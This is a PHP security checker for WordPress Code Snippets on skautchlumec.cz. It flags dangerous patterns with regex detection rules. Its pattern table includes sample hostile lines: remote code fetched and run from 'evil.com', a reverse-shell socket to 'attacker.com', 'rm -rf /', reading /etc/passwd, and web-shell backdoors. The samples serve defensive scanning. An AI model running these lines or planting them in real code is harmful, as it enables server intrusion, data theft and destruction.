<?php
/**
 * WordPress Code Snippet Security Checker
 * Site: skautchlumec.cz
 *
 * USAGE:
 *   CLI:     php snippet_security_check.php
 *   Browser: Upload to server temporarily, access with ?audit_key=...
 *
 * This script checks PHP code snippets for dangerous patterns.
 * Paste or provide snippet code and get a risk assessment.
 *
 * Compatible: PHP 7.4+
 */

// ============================================================
//  CONFIGURATION
// ============================================================
define('CHECKER_KEY', 'CHANGE_ME_NOW');
// ============================================================

$is_cli = (PHP_SAPI === 'cli');

if (!$is_cli) {
    // Browser access requires key
    if (!isset($_GET['audit_key']) || $_GET['audit_key'] !== CHECKER_KEY) {
        http_response_code(403);
        die('403 Forbidden');
    }
    header('Content-Type: text/html; charset=UTF-8');
}

// ============================================================
//  PATTERN DEFINITIONS
// ============================================================

$DANGEROUS_PATTERNS = [

    // ---- CRITICAL: Remote code execution ----
    [
        'name'    => 'eval()',
        'pattern' => '/\beval\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Executes arbitrary PHP code from a string. Almost never legitimate in snippets.',
        'example' => 'eval(base64_decode("...")); // classic backdoor pattern',
    ],
    [
        'name'    => 'exec()',
        'pattern' => '/\bexec\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Executes system shell commands.',
        'example' => 'exec("rm -rf /");',
    ],
    [
        'name'    => 'system()',
        'pattern' => '/\bsystem\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Executes system shell commands and prints output.',
        'example' => 'system($_GET["cmd"]);',
    ],
    [
        'name'    => 'passthru()',
        'pattern' => '/\bpassthru\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Executes shell commands, passes raw output to browser.',
        'example' => 'passthru($_POST["c"]);',
    ],
    [
        'name'    => 'shell_exec()',
        'pattern' => '/\bshell_exec\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Executes shell commands via shell.',
        'example' => '$out = shell_exec("cat /etc/passwd");',
    ],
    [
        'name'    => 'proc_open()',
        'pattern' => '/\bproc_open\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Opens a process with I/O pipes. Full command execution.',
        'example' => 'proc_open("bash", $desc, $pipes);',
    ],
    [
        'name'    => 'popen()',
        'pattern' => '/\bpopen\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Opens a pipe to a shell process.',
        'example' => '$h = popen("ls", "r");',
    ],
    [
        'name'    => 'create_function()',
        'pattern' => '/\bcreate_function\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Creates a lambda function that can execute arbitrary code. Deprecated in PHP 7.2, removed in PHP 8.0.',
        'example' => '$f = create_function("", base64_decode("..."));',
    ],
    [
        'name'    => 'preg_replace with /e modifier',
        'pattern' => '#preg_replace\s*\(\s*[\'"/].*?/e[\'"\s,]#i',
        'severity'=> 'CRITICAL',
        'reason'  => 'The /e modifier causes the replacement to be evaluated as PHP code. Removed in PHP 7.',
        'example' => 'preg_replace("/pattern/e", $_GET["x"], "subject");',
    ],

    // ---- CRITICAL: Obfuscation / encoding ----
    [
        'name'    => 'base64_decode()',
        'pattern' => '/\bbase64_decode\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Used to hide/obfuscate malicious code. Often combined with eval().',
        'example' => 'eval(base64_decode("cGhwaW5mbygpOw=="));',
        'note'    => 'Legitimate use exists (e.g., decoding email attachments) but very rare in WP snippets.',
    ],
    [
        'name'    => 'gzinflate() / gzuncompress() / gzdecode()',
        'pattern' => '/\b(gzinflate|gzuncompress|gzdecode|gzdeflate)\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Used to decompress encoded payloads, often combined with eval().',
        'example' => 'eval(gzinflate(base64_decode("...")));',
    ],
    [
        'name'    => 'str_rot13()',
        'pattern' => '/\bstr_rot13\s*\(/i',
        'severity'=> 'WARNING',
        'reason'  => 'Simple obfuscation cipher. Used to hide code from signature scanners.',
        'example' => 'eval(str_rot13("riny(\"...\")")); ',
    ],

    // ---- CRITICAL: File operations ----
    [
        'name'    => 'file_put_contents()',
        'pattern' => '/\bfile_put_contents\s*\(/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Writes arbitrary content to files. Can create backdoors or overwrite core files.',
        'example' => 'file_put_contents("/var/www/html/backdoor.php", "<?php eval($_GET[c]);");',
    ],
    [
        'name'    => 'file_get_contents() with http',
        'pattern' => '/file_get_contents\s*\(\s*[\'"]https?:/i',
        'severity'=> 'WARNING',
        'reason'  => 'Fetches remote content that could contain malicious code.',
        'example' => 'eval(file_get_contents("http://evil.com/payload.php"));',
    ],
    [
        'name'    => 'fwrite() to PHP file',
        'pattern' => '/\bfwrite\s*\(/i',
        'severity'=> 'WARNING',
        'reason'  => 'Writes to files. Context-dependent but can be used to create backdoors.',
        'example' => 'fwrite($handle, "<?php system($_GET[\'c\']); ?>");',
    ],

    // ---- WARNING: Network/remote calls ----
    [
        'name'    => 'curl_exec()',
        'pattern' => '/\bcurl_exec\s*\(/i',
        'severity'=> 'WARNING',
        'reason'  => 'Executes a cURL transfer. Can fetch and execute remote content.',
        'example' => 'eval(curl_exec($ch)); // fetches and runs remote code',
        'note'    => 'Legitimate WordPress plugins use curl_exec frequently. Context matters.',
    ],
    [
        'name'    => 'fsockopen()',
        'pattern' => '/\bfsockopen\s*\(/i',
        'severity'=> 'WARNING',
        'reason'  => 'Opens a raw socket connection. Can be used for reverse shells.',
        'example' => '$sock = fsockopen("attacker.com", 4444);',
    ],

    // ---- WARNING: Indirect code execution ----
    [
        'name'    => 'assert()',
        'pattern' => '/\bassert\s*\(/i',
        'severity'=> 'WARNING',
        'reason'  => 'In PHP < 8, assert() evaluates string arguments as PHP code.',
        'example' => 'assert(base64_decode("...")); // PHP 5/7 RCE',
    ],
    [
        'name'    => 'call_user_func() / call_user_func_array()',
        'pattern' => '/\bcall_user_func(_array)?\s*\(/i',
        'severity'=> 'WARNING',
        'reason'  => 'Calls functions dynamically. Can be used to call system/exec with obfuscated names.',
        'example' => 'call_user_func("system", $_GET["cmd"]);',
        'note'    => 'Very common in legitimate WordPress code. Only suspicious if arguments come from $_GET/$_POST.',
    ],
    [
        'name'    => 'Variable function call ($var())',
        'pattern' => '/\$[a-z_][a-z0-9_]*\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)\s*\[/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Calls a function whose name comes from a variable, with user input as argument.',
        'example' => '$func = $_GET["f"]; $func($_GET["arg"]);',
    ],

    // ---- WARNING: User input in dangerous contexts ----
    [
        'name'    => '$_GET/$_POST in eval/exec/system',
        'pattern' => '/(eval|exec|system|passthru|shell_exec|assert)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Direct user input passed to code/command execution function.',
        'example' => 'eval($_POST["code"]);',
    ],
    [
        'name'    => 'Unsanitized $_GET/$_POST in SQL',
        'pattern' => '/\$wpdb\s*->\s*(query|get_results|get_var|get_row)\s*\([^)]*\$_(GET|POST|REQUEST|COOKIE)/i',
        'severity'=> 'CRITICAL',
        'reason'  => 'Direct user input in database query - SQL injection vulnerability.',
        'example' => '$wpdb->query("SELECT * FROM users WHERE id=" . $_GET["id"]);',
    ],

    // ---- INFO: Notable but may be legitimate ----
    [
        'name'    => 'Backtick operator (`command`)',
        'pattern' => '/`[^`]{3,}`/',
        'severity'=> 'WARNING',
        'reason'  => 'PHP backtick operator executes shell commands (alias for shell_exec).',
        'example' => '$result = `ls -la /var/www`;',
    ],
    [
        'name'    => 'Long base64-like strings (obfuscation)',
        'pattern' => '/[\'"][A-Za-z0-9+\/=]{100,}[\'"]/',
        'severity'=> 'WARNING',
        'reason'  => 'Long base64-encoded string may be obfuscated malicious code.',
        'example' => '"cGhwaW5mbygpO3N5c3RlbSgiY2F0IC9ldGMvcGFzc3dkIik7" // encoded payload',
    ],
    [
        'name'    => 'WordPress nonce bypass patterns',
        'pattern' => '/add_action\s*\(\s*[\'"]wp_ajax_nopriv_/i',
        'severity'=> 'INFO',
        'reason'  => 'AJAX action accessible without authentication. Verify this is intentional.',
        'example' => 'add_action("wp_ajax_nopriv_myaction", "handler"); // no login required',
    ],
    [
        'name'    => 'Disabling SSL verification',
        'pattern' => '/\'sslverify\'\s*=>\s*false/i',
        'severity'=> 'INFO',
        'reason'  => 'Disables SSL certificate verification in WordPress HTTP API calls.',
        'example' => 'wp_remote_get($url, ["sslverify" => false]);',
    ],
];


// ============================================================
//  ANALYSIS FUNCTION
// ============================================================

function analyze_snippet(string $code, array $patterns): array {
    $findings = [];
    $lines = explode("\n", $code);

    foreach ($patterns as $check) {
        if (preg_match($check['pattern'], $code, $match, PREG_OFFSET_CAPTURE)) {
            // Find which line the match is on
            $offset = $match[0][1];
            $before = substr($code, 0, $offset);
            $line_num = substr_count($before, "\n") + 1;

            // Get the line context
            $line_content = trim($lines[$line_num - 1] ?? '');

            $findings[] = [
                'name'      => $check['name'],
                'severity'  => $check['severity'],
                'reason'    => $check['reason'],
                'line'      => $line_num,
                'context'   => $line_content,
                'note'      => $check['note'] ?? null,
                'example'   => $check['example'] ?? null,
            ];
        }
    }

    // Sort by severity
    $order = ['CRITICAL' => 0, 'WARNING' => 1, 'INFO' => 2];
    usort($findings, fn($a, $b) => ($order[$a['severity']] ?? 9) - ($order[$b['severity']] ?? 9));

    return $findings;
}

function overall_risk(array $findings): string {
    $severities = array_column($findings, 'severity');
    if (in_array('CRITICAL', $severities)) return 'CRITICAL';
    if (in_array('WARNING', $severities))  return 'WARNING';
    if (in_array('INFO', $severities))     return 'INFO';
    return 'CLEAN';
}


// ============================================================
//  CLI MODE
// ============================================================
if ($is_cli) {
    $colors = [
        'CRITICAL' => "\033[1;31m", // Bold red
        'WARNING'  => "\033[1;33m", // Bold yellow
        'INFO'     => "\033[1;34m", // Bold blue
        'CLEAN'    => "\033[1;32m", // Bold green
        'RESET'    => "\033[0m",
    ];

    echo "\n=== WordPress Snippet Security Checker ===\n";
    echo "Paste PHP code below (press Ctrl+D when done):\n\n";

    $code = stream_get_contents(STDIN);

    if (empty(trim($code))) {
        // Try reading from first argument as file path
        if (!empty($argv[1]) && file_exists($argv[1])) {
            $code = file_get_contents($argv[1]);
            echo "Analyzing file: {$argv[1]}\n";
        } else {
            echo "No code provided. Usage:\n";
            echo "  php snippet_security_check.php < code.php\n";
            echo "  php snippet_security_check.php code.php\n";
            echo "  echo '<?php eval(\$_GET[\"c\"]);' | php snippet_security_check.php\n";
            exit(1);
        }
    }

    $findings = analyze_snippet($code, $DANGEROUS_PATTERNS);
    $risk = overall_risk($findings);

    echo "\n" . str_repeat('=', 60) . "\n";
    echo "OVERALL RISK: " . $colors[$risk] . $risk . $colors['RESET'] . "\n";
    echo str_repeat('=', 60) . "\n";

    if (empty($findings)) {
        echo $colors['CLEAN'] . "No dangerous patterns detected.\n" . $colors['RESET'];
        echo "Still recommended: manual review of all logic.\n\n";
    } else {
        echo "Found " . count($findings) . " issue(s):\n\n";
        foreach ($findings as $i => $f) {
            $c = $colors[$f['severity']] ?? $colors['INFO'];
            echo sprintf("[%d] %s%-8s%s %s (line ~%d)\n",
                $i + 1, $c, $f['severity'], $colors['RESET'],
                $f['name'], $f['line']
            );
            echo "     Reason: " . $f['reason'] . "\n";
            if ($f['context']) {
                echo "     Code:   " . substr($f['context'], 0, 80) . (strlen($f['context']) > 80 ? '...' : '') . "\n";
            }
            if ($f['note']) {
                echo "     Note:   " . $f['note'] . "\n";
            }
            echo "\n";
        }
    }
    exit(empty($findings) ? 0 : 1);
}


// ============================================================
//  BROWSER MODE
// ============================================================
$submitted_code = $_POST['code'] ?? '';
$submitted_name = trim($_POST['snippet_name'] ?? 'Unnamed Snippet');
$findings = [];
$risk = null;

if (!empty($submitted_code)) {
    $findings = analyze_snippet($submitted_code, $DANGEROUS_PATTERNS);
    $risk = overall_risk($findings);
}

$risk_colors = [
    'CRITICAL' => ['bg' => '#c0392b', 'text' => '#fff'],
    'WARNING'  => ['bg' => '#e67e22', 'text' => '#fff'],
    'INFO'     => ['bg' => '#2980b9', 'text' => '#fff'],
    'CLEAN'    => ['bg' => '#27ae60', 'text' => '#fff'],
];

?>
<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snippet Security Checker - skautchlumec.cz</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #2c3e50; }
        textarea { width: 100%; height: 350px; font-family: 'Courier New', monospace; font-size: 0.85em; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; resize: vertical; }
        input[type="text"] { width: 100%; padding: 8px 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 1em; box-sizing: border-box; margin-bottom: 10px; }
        button { background: #2c3e50; color: white; border: none; padding: 12px 30px; border-radius: 5px; font-size: 1em; cursor: pointer; margin-top: 10px; }
        button:hover { background: #34495e; }
        .result { margin-top: 25px; }
        .risk-badge { display: inline-block; padding: 8px 20px; border-radius: 5px; font-size: 1.3em; font-weight: bold; margin-bottom: 20px; }
        .finding { margin: 10px 0; padding: 15px; border-radius: 5px; border-left: 5px solid #ccc; background: #f9f9f9; }
        .finding.CRITICAL { border-color: #c0392b; background: #fde8e8; }
        .finding.WARNING  { border-color: #e67e22; background: #fef3e2; }
        .finding.INFO     { border-color: #2980b9; background: #eaf3fb; }
        .finding h4 { margin: 0 0 8px 0; }
        .finding code { background: #2d2d2d; color: #f8f8f2; padding: 3px 8px; border-radius: 3px; font-size: 0.85em; display: inline-block; max-width: 100%; overflow-x: auto; word-break: break-all; }
        .sev { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.8em; font-weight: bold; color: white; }
        .sev-CRITICAL { background: #c0392b; }
        .sev-WARNING  { background: #e67e22; }
        .sev-INFO     { background: #2980b9; }
        .clean { background: #e8f8ee; border: 1px solid #27ae60; padding: 20px; border-radius: 5px; color: #27ae60; font-size: 1.1em; }
        label { font-weight: bold; display: block; margin-bottom: 5px; }
        .tip { background: #eaf3fb; padding: 10px 15px; border-radius: 5px; font-size: 0.9em; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <h1>Snippet Security Checker</h1>
    <p style="color:#666;">Paste a Code Snippets plugin snippet below to check for dangerous PHP patterns. For site: <strong>skautchlumec.cz</strong></p>

    <form method="POST" action="?audit_key=<?= htmlspecialchars(CHECKER_KEY) ?>">
        <label for="snippet_name">Snippet Name / ID:</label>
        <input type="text" id="snippet_name" name="snippet_name"
               value="<?= htmlspecialchars($submitted_name) ?>"
               placeholder="e.g. Snippet #25 - Custom Login Redirect">

        <label for="code">Snippet PHP Code:</label>
        <textarea id="code" name="code" placeholder="<?php /* Paste snippet code here */ ?>"><?= htmlspecialchars($submitted_code) ?></textarea>
        <br>
        <button type="submit">&#128269; Analyze Snippet</button>
    </form>

    <?php if ($risk !== null): ?>
    <div class="result">
        <h2>Results for: <?= htmlspecialchars($submitted_name) ?></h2>

        <?php $rc = $risk_colors[$risk] ?? $risk_colors['CLEAN']; ?>
        <div class="risk-badge" style="background:<?= $rc['bg'] ?>;color:<?= $rc['text'] ?>;">
            Overall Risk: <?= htmlspecialchars($risk) ?>
        </div>

        <?php if (empty($findings)): ?>
            <div class="clean">
                &#10003; No dangerous patterns detected in this snippet.<br>
                <small>Note: Automated checks are not exhaustive. Always review snippet logic manually.</small>
            </div>
        <?php else: ?>
            <p>Found <strong><?= count($findings) ?></strong> issue(s). Review each finding carefully:</p>
            <?php foreach ($findings as $i => $f): ?>
            <div class="finding <?= htmlspecialchars($f['severity']) ?>">
                <h4>
                    <span class="sev sev-<?= htmlspecialchars($f['severity']) ?>"><?= htmlspecialchars($f['severity']) ?></span>
                    &nbsp;<?= htmlspecialchars($f['name']) ?>
                    <span style="font-weight:normal;font-size:0.9em;color:#666;">(~line <?= (int)$f['line'] ?>)</span>
                </h4>
                <p style="margin:5px 0;"><?= htmlspecialchars($f['reason']) ?></p>
                <?php if ($f['context']): ?>
                <p style="margin:5px 0;">Code context: <code><?= htmlspecialchars(substr($f['context'], 0, 120)) ?></code></p>
                <?php endif; ?>
                <?php if ($f['note']): ?>
                <p style="margin:5px 0;color:#666;font-style:italic;font-size:0.9em;">Note: <?= htmlspecialchars($f['note']) ?></p>
                <?php endif; ?>
            </div>
            <?php endforeach; ?>
        <?php endif; ?>

        <div class="tip">
            <strong>What to do:</strong> CRITICAL findings mean the snippet should be deactivated immediately and investigated.
            WARNING findings require manual review to determine if they're legitimate.
            INFO findings are noteworthy but likely benign.
            When in doubt, deactivate the snippet and investigate.
        </div>
    </div>
    <?php endif; ?>

</div>
</body>
</html>
